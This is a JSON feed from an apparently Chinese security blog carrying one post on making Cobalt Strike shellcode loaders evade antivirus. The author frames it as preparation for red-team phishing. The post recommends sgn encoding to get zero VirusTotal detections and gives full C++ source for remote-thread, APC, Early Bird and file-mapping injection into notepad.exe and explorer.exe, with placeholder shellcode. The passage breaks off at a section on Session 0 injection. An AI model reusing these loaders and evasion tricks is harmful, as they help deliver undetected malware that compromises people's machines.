{
    "version": "https://jsonfeed.org/version/1",
    "title": "shutTD",
    "subtitle": "Cyber AD",
    "icon": "https://shut-td.github.io/images/favicon.ico",
    "description": "菜只因~",
    "home_page_url": "https://shut-td.github.io",
    "items": [
        {
            "id": "https://shut-td.github.io/CS%E8%BF%9C%E6%8E%A7%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF%E4%B8%8E%E5%AE%9E%E7%8E%B0/",
            "url": "https://shut-td.github.io/CS%E8%BF%9C%E6%8E%A7%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF%E4%B8%8E%E5%AE%9E%E7%8E%B0/",
            "title": "CS远控免杀思路与实现",
            "date_published": "2024-07-16T02:13:27.000Z",
            "content_html": "<h3 id=\"cs原生shellcode上线免杀\"><a class=\"anchor\" href=\"#cs原生shellcode上线免杀\">#</a> CS 原生 shellcode 上线免杀</h3>\n<p>最近攻防在即所以想要尝试写免杀🐎钓钓鱼，所以小学了一手一些比较好用且免杀效果比较好的手法做一下总结，从几个角度去组合免杀。</p>\n<h5 id=\"shellcode免杀\"><a class=\"anchor\" href=\"#shellcode免杀\">#</a> shellcode 免杀</h5>\n<p>sgn 编码 (内存自解密)，可以很好的做到静态免杀的效果不需要做其他任何加密手段即可做到静态免杀，可以尝试 sgn 编码后传 vt 一般就是 0 查杀。</p>\n<p>用法：将 shellcode 二进制文件例如 xx.bin 保存，使用 sgn.exe 进行编码，需要注意的是系统位数要对</p>\n<p><strong>原始 shellcode</strong> (用 winhex 等二进制编辑器打开):<img data-src=\"https://dlink.host/wx4.sinaimg.cn/large/008DfUDOly8hrpo6edkdoj30hk0drwk8.jpg\" alt=\"\" /><br />\n<strong>sgn 进行编码</strong>:<img data-src=\"https://dlink.host/wx1.sinaimg.cn/large/008DfUDOly8hrpo6it3a1j30v10apmyj.jpg\" alt=\"\" /><br />\n<strong> 编码后的 shellcode</strong>:<img data-src=\"https://dlink.host/wx1.sinaimg.cn/large/008DfUDOly8hrpo6ptt93j30rs0t819n.jpg\" alt=\"\" /></p>\n<p>这种静态免杀效果很好基本上无需做其他任何加密处理，同时还做到了降熵，当然这里还可以将二进制文件托管到服务器上然后通过 http 请求来获取 shellcode，也可以配合图片隐写进行 shellcode 的隐藏。</p>\n<h4 id=\"代码与进程注入手法\"><a class=\"anchor\" href=\"#代码与进程注入手法\">#</a> 代码与进程注入手法</h4>\n<p><em><strong>CreateRemoteThread (远程线程注入)</strong></em><br />\n 注入流程：<br />\n1、根据进程名寻找 pid，用于后续进程注入<br />\n 2、根据 pid 打开指定进程句柄<br />\n 3、向指定进程申请可读可写可执行的内存区域<br />\n 4、将 shellcode 或 dll 注入到该内存区域中<br />\n 5、开辟一个新线程执行</p>\n<p><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;Windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;Tlhelp32.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\">DWORD <span class=\"title\">GetProcessIdByName</span><span class=\"params\">(LPCTSTR lpszProcessName)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    HANDLE hSnapshot = <span class=\"built_in\">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (hSnapshot == INVALID_HANDLE_VALUE)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    PROCESSENTRY32 pe;</span><br><span class=\"line\">    pe.dwSize = <span class=\"keyword\">sizeof</span> pe;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">Process32First</span>(hSnapshot, &amp;pe))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"keyword\">do</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"built_in\">lstrcmpi</span>(lpszProcessName, pe.szExeFile) == <span class=\"number\">0</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">                <span class=\"built_in\">CloseHandle</span>(hSnapshot);</span><br><span class=\"line\">                <span class=\"keyword\">return</span> pe.th32ProcessID;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">while</span> (<span class=\"built_in\">Process32Next</span>(hSnapshot, &amp;pe));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">CloseHandle</span>(hSnapshot);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">char</span> path[] = <span class=\"string\">&quot;C:\\\\xxx\\\\TestDll.dll&quot;</span>;   <span class=\"comment\">//dll注入</span></span><br><span class=\"line\"><span class=\"type\">char</span> shellcode[] = &#123;\\x12&#125;;  <span class=\"comment\">//shellcode注入 </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">DllInjectMain</span><span class=\"params\">()</span> <span class=\"comment\">//dll注入</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    HANDLE hProcess = <span class=\"built_in\">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class=\"number\">0</span>, <span class=\"built_in\">GetProcessIdByName</span>((LPCTSTR)<span class=\"string\">&quot;notepad.exe&quot;</span>));    </span><br><span class=\"line\">    LPVOID lpBaseAddress = <span class=\"built_in\">VirtualAllocEx</span>(hProcess, <span class=\"number\">0</span>, <span class=\"number\">0x1000</span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">    <span class=\"built_in\">WriteProcessMemory</span>(hProcess, lpBaseAddress, path, <span class=\"built_in\">sizeof</span>(path), <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">    LPTHREAD_START_ROUTINE pLoadlibrary = (LPTHREAD_START_ROUTINE)<span class=\"built_in\">GetProcAddress</span>(<span class=\"built_in\">GetModuleHandleA</span>(<span class=\"string\">&quot;kernel32.dll&quot;</span>), <span class=\"string\">&quot;LoadLibraryA&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">CreateRemoteThread</span>(hProcess, <span class=\"number\">0</span>, <span class=\"number\">0</span>, (LPTHREAD_START_ROUTINE)pLoadlibrary, lpBaseAddress, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">ShellcodeInjectMain</span><span class=\"params\">()</span></span>&#123;   <span class=\"comment\">//shellcode注入</span></span><br><span class=\"line\">      HANDLE hProcess = <span class=\"built_in\">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class=\"number\">0</span>, <span class=\"built_in\">GetProcessIdByName</span>((LPCTSTR)<span class=\"string\">&quot;notepad.exe&quot;</span>));</span><br><span class=\"line\">      LPVOID lpBaseAddress = <span class=\"built_in\">VirtualAllocEx</span>(hProcess, <span class=\"number\">0</span>, <span class=\"number\">0x1000</span>(或者<span class=\"keyword\">sizeof</span> shellcdoe), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">      <span class=\"built_in\">WriteProcessMemory</span>(hProcess, lpBaseAddress, shellcode, <span class=\"built_in\">sizeof</span>(shellcode), <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">      <span class=\"built_in\">CreateRemoteThread</span>(hProcess, <span class=\"number\">0</span>, <span class=\"number\">0</span>, (LPTHREAD_START_ROUTINE)lpBaseAddress, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><br />\n 这种直接的线程注入容易暴毙，建议搭配其他手段食用。</p>\n<p><em><strong>APC Injection (APC 注入)</strong></em><br />\n 每个线程都有自己的 APC 队列，应用程序通过调用<strong> QueueUserAPC</strong> 函数将 APC 排队到线程中，调用线程在对<strong> QueueUserAPC</strong> 的调用中指定 APC 函数的地址，当 APC 排队到线程中时，系统会发出软件中断。下次调度线程时，它将运行 APC 功能。<br />\n注入流程：<br />\n1、根据进程名确定 pid<br />\n2、通过 pid 遍历 tid<br />\n3、插入 APC 队列</p>\n<p><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;Windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;Tlhelp32.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">DWORD <span class=\"title\">GetProcessIdByName</span><span class=\"params\">(LPCTSTR lpszProcessName)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    HANDLE hSnapshot = <span class=\"built_in\">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (hSnapshot == INVALID_HANDLE_VALUE)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    PROCESSENTRY32 pe;</span><br><span class=\"line\">    pe.dwSize = <span class=\"keyword\">sizeof</span> pe;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">Process32First</span>(hSnapshot, &amp;pe))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"keyword\">do</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"built_in\">lstrcmpi</span>(lpszProcessName, pe.szExeFile) == <span class=\"number\">0</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">                <span class=\"built_in\">CloseHandle</span>(hSnapshot);</span><br><span class=\"line\">                <span class=\"keyword\">return</span> pe.th32ProcessID;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">while</span> (<span class=\"built_in\">Process32Next</span>(hSnapshot, &amp;pe));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">CloseHandle</span>(hSnapshot);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">BOOL <span class=\"title\">GetAllThreadIdByProcessId</span><span class=\"params\">(DWORD dwProcessId)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    DWORD dwBufferLength = <span class=\"number\">1000</span>;</span><br><span class=\"line\">    THREADENTRY32 te32 = &#123; <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\">    HANDLE hSnapshot = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    BOOL bRet = TRUE;</span><br><span class=\"line\">    <span class=\"comment\">// 获取线程快照</span></span><br><span class=\"line\">    ::<span class=\"built_in\">RtlZeroMemory</span>(&amp;te32, <span class=\"built_in\">sizeof</span>(te32));</span><br><span class=\"line\">    te32.dwSize = <span class=\"built_in\">sizeof</span>(te32);</span><br><span class=\"line\">    hSnapshot = ::<span class=\"built_in\">CreateToolhelp32Snapshot</span>(TH32CS_SNAPTHREAD, <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 获取第一条线程快照信息</span></span><br><span class=\"line\">    bRet = ::<span class=\"built_in\">Thread32First</span>(hSnapshot, &amp;te32);</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (bRet)&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 获取进程对应的线程ID</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (te32.th32OwnerProcessID == dwProcessId)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> te32.th32ThreadID;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// 遍历下一个线程快照信息</span></span><br><span class=\"line\">        bRet = ::<span class=\"built_in\">Thread32Next</span>(hSnapshot, &amp;te32);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">DllInjdectMain</span><span class=\"params\">()</span> </span>&#123;   <span class=\"comment\">//dll注入</span></span><br><span class=\"line\">    FARPROC pLoadLibrary = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    HANDLE hThread = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    HANDLE hProcess = <span class=\"number\">0</span>;</span><br><span class=\"line\">    DWORD Threadid = <span class=\"number\">0</span>;</span><br><span class=\"line\">    DWORD ProcessId = <span class=\"number\">0</span>;</span><br><span class=\"line\">    BYTE DllName[] = <span class=\"string\">&quot;C:\\\\Users\\\\Black Sheep\\\\source\\\\repos\\\\ApcInject\\\\x64\\\\Debug\\\\TestDll.dll&quot;</span>;</span><br><span class=\"line\">    LPVOID AllocAddr = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    ProcessId = <span class=\"built_in\">GetProcessIdByName</span>(<span class=\"string\">L&quot;explorer.exe&quot;</span>);</span><br><span class=\"line\">    hProcess = <span class=\"built_in\">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class=\"number\">0</span>, ProcessId);</span><br><span class=\"line\">    pLoadLibrary = <span class=\"built_in\">GetProcAddress</span>(<span class=\"built_in\">GetModuleHandle</span>(<span class=\"string\">L&quot;kernel32.dll&quot;</span>), <span class=\"string\">&quot;LoadLibraryA&quot;</span>);</span><br><span class=\"line\">    AllocAddr = <span class=\"built_in\">VirtualAllocEx</span>(hProcess, <span class=\"number\">0</span>, <span class=\"built_in\">sizeof</span>(DllName) + <span class=\"number\">1</span>, MEM_COMMIT, PAGE_READWRITE);</span><br><span class=\"line\">    <span class=\"built_in\">WriteProcessMemory</span>(hProcess, AllocAddr, DllName, <span class=\"built_in\">sizeof</span>(DllName) + <span class=\"number\">1</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">    Threadid = <span class=\"built_in\">GetAllThreadIdByProcessId</span>(ProcessId);</span><br><span class=\"line\">    hThread = <span class=\"built_in\">OpenThread</span>(THREAD_ALL_ACCESS, <span class=\"number\">0</span>, Threadid);</span><br><span class=\"line\">    <span class=\"built_in\">QueueUserAPC</span>((PAPCFUNC)pLoadLibrary, hThread, (ULONG_PTR)AllocAddr);</span><br><span class=\"line\">    <span class=\"built_in\">CloseHandle</span>(hProcess);</span><br><span class=\"line\">    <span class=\"built_in\">CloseHandle</span>(hThread);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">ShellcodeInjectMain</span><span class=\"params\">()</span></span>&#123;   <span class=\"comment\">//shellcode注入</span></span><br><span class=\"line\">    HANDLE hThread = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    HANDLE hProcess = <span class=\"number\">0</span>;</span><br><span class=\"line\">    DWORD Threadid = <span class=\"number\">0</span>;</span><br><span class=\"line\">    DWORD ProcessId = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"type\">char</span> shellcode[] = &#123;\\x12&#125;; <span class=\"comment\">//shellcode</span></span><br><span class=\"line\">    ProcessId = <span class=\"built_in\">GetProcessIdByName</span>(<span class=\"string\">L&quot;explorer.exe&quot;</span>);</span><br><span class=\"line\">    hProcess = <span class=\"built_in\">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class=\"number\">0</span>, ProcessId);</span><br><span class=\"line\">    LPVOID lpBaseeAddresss = (LPVOID)<span class=\"built_in\">VirtualAllocEx</span>(hProcess, <span class=\"literal\">NULL</span>, <span class=\"number\">0X1000</span>, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">    <span class=\"built_in\">WriteProcessMemory</span>(hProcess, lpBaseeAddresss, shellcode, <span class=\"built_in\">sizeof</span>(shellcode) + <span class=\"number\">1</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">    Threadid = <span class=\"built_in\">GetAllThreadIdByProcessId</span>(ProcessId);</span><br><span class=\"line\">    hThread = <span class=\"built_in\">OpenThread</span>(THREAD_ALL_ACCESS, <span class=\"number\">0</span>, Threadid);</span><br><span class=\"line\">    <span class=\"built_in\">QueueUserAPC</span>((PAPCFUNC)lpBaseeAddresss, hThread, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">    <span class=\"built_in\">CloseHandle</span>(hProcess);</span><br><span class=\"line\">    <span class=\"built_in\">CloseHandle</span>(hThread);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><em><strong>Early Bird (进阶版 APC 注入)</strong></em><br />\n 先创建一个挂起的白进程并申请一块 RWX 内存用于写入 shellcode，再使用 APC 注入插入线程，再恢复线程。实际上就是在白进程上偷摸注入一个新线程跑 shellcode。<br />\n注入流程跟上述 APC 注入差不多</p>\n<p><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;Windows.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">char</span> shellcode[] = &#123;<span class=\"string\">&quot;\\0x1&quot;</span>&#125;;  <span class=\"comment\">//恶意shellcode</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    STARTUPINFO si = &#123; <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\">    PROCESS_INFORMATION pi = &#123; <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\">    si.cb = <span class=\"built_in\">sizeof</span>(STARTUPINFO);   </span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"built_in\">CreateProcessA</span>(<span class=\"string\">&quot;C:\\\\Windows\\\\System32\\\\notepad.exe&quot;</span>, <span class=\"literal\">NULL</span>, <span class=\"literal\">NULL</span>, <span class=\"literal\">NULL</span>, TRUE, CREATE_SUSPENDED | EMBDHLP_CREATENOW, <span class=\"literal\">NULL</span>, <span class=\"literal\">NULL</span>, (LPSTARTUPINFOA)&amp;si, &amp;pi);</span><br><span class=\"line\">    LPVOID lpBaseeAddresss = (LPVOID)<span class=\"built_in\">VirtualAllocEx</span>(pi.hProcess, <span class=\"literal\">NULL</span>, <span class=\"number\">0X1000</span>, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">    <span class=\"built_in\">WriteProcessMemory</span>(pi.hProcess, lpBaseeAddresss, (LPVOID)shellcode, <span class=\"built_in\">sizeof</span>(shellcode), <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">    <span class=\"built_in\">QueueUserAPC</span>((PAPCFUNC)lpBaseeAddresss, pi.hThread, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"built_in\">ResumeThread</span>(pi.hThread);</span><br><span class=\"line\">    <span class=\"built_in\">CloseHandle</span>(pi.hThread);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br />\n 这个免杀手法十分的好用，推荐再稍微搭配一下其他规避手段就可以绕过绝大多数杀软做到无感上线，实际代码和上线效果贴在文末。</p>\n<p><em><strong>Mapping Injection (内存映射注入)</strong></em><br />\n 先在物理内存中开辟一段空间用于写入恶意 shellcode，后续利用 MapViewOfFile2 将该恶意内存区域映射到指定进程中的虚拟内存中去，达到 shellcode 注入的效果。<br />\n注入流程：<br />\n1、创建 Mapping 句柄<br />\n 2、将 shellcode 复制到该物理内存地址中去<br />\n 3、将该段物理内存映射到虚拟内存中<br />\n 4、利用任意方法执行到该地址的 shellcode</p>\n<p><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">pragma</span> comment (lib, <span class=\"string\">&quot;OneCore.lib&quot;</span>)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">char</span> shellcode[] = &#123;<span class=\"number\">0x12</span>&#125;;  <span class=\"comment\">//shellcode</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">     STARTUPINFO si = &#123; <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\">     PROCESS_INFORMATION pi = &#123; <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\">     si.cb = <span class=\"built_in\">sizeof</span>(STARTUPINFO);</span><br><span class=\"line\">     </span><br><span class=\"line\">     HANDLE hMapping = <span class=\"built_in\">CreateFileMapping</span>(INVALID_HANDLE_VALUE, <span class=\"literal\">NULL</span>, PAGE_EXECUTE_READWRITE, <span class=\"number\">0</span>, <span class=\"built_in\">sizeof</span>(shellcode), <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">     LPVOID lpMapAddress = <span class=\"built_in\">MapViewOfFile</span>(hMapping, FILE_MAP_WRITE, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"built_in\">sizeof</span>(shellcode));</span><br><span class=\"line\">     <span class=\"built_in\">memcpy</span>((PVOID)lpMapAddress, shellcode, <span class=\"built_in\">sizeof</span>(shellcode));</span><br><span class=\"line\">     <span class=\"built_in\">CreateProcessA</span>(<span class=\"string\">&quot;C:\\\\Windows\\\\System32\\\\notepad.exe&quot;</span>, <span class=\"literal\">NULL</span>, <span class=\"literal\">NULL</span>, <span class=\"literal\">NULL</span>, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW, <span class=\"literal\">NULL</span>, <span class=\"literal\">NULL</span>, (LPSTARTUPINFOA)&amp;si, &amp;pi);</span><br><span class=\"line\">     LPVOID lpMapAddressRemote = <span class=\"built_in\">MapViewOfFile2</span>(hMapping, pi.hProcess, <span class=\"number\">0</span>, <span class=\"literal\">NULL</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, PAGE_EXECUTE_READ);</span><br><span class=\"line\">     </span><br><span class=\"line\">     <span class=\"built_in\">QueueUserAPC</span>((PAPCFUNC)lpMapAddressRemote, pi.hThread, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">     <span class=\"built_in\">ResumeThread</span>(pi.hThread);</span><br><span class=\"line\">     <span class=\"built_in\">CloseHandle</span>(pi.hThread);</span><br><span class=\"line\">     <span class=\"built_in\">CloseHandle</span>(hMapping);</span><br><span class=\"line\">     <span class=\"built_in\">UnmapViewOfFile</span>(lpMapAddress);</span><br><span class=\"line\">     <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"><span class=\"comment\">//Mapping Injection + Early Bird</span></span><br></pre></td></tr></table></figure><br />\n 可以和其他手段组合，比如 Early Bird 来达到强规避的效果</p>\n<p><em><strong>Bypass Session 0 Injection (系统进程注入绕过)</strong></em><br />\n 